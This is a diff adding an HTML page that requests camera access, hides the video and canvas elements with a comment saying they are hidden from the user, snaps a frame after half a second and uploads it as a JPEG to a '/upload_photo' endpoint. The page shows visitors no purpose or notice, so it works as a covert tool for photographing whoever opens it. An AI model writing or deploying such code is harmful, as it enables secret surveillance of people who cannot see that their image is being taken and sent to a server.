@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Camera Capture</title>
+  <style>
+    video, canvas {
+      display: none; /* Hide video and canvas from user */
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    // Request camera access
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
+
+        // Wait a moment for video to load before capturing
+        setTimeout(() => {
+          captureAndSend();
+        }, 500); // Capture quickly (0.5s delay)
+      })
+      .catch((err) => {
+        console.error("Camera access denied or not available", err);
+      });
+
+    function captureAndSend() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imageData = canvas.toDataURL('image/jpeg');
+
+      fetch('/upload_photo', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ image: imageData })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Success:', data);
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+      });
+    }
+  </script>
+</body>
+</html>
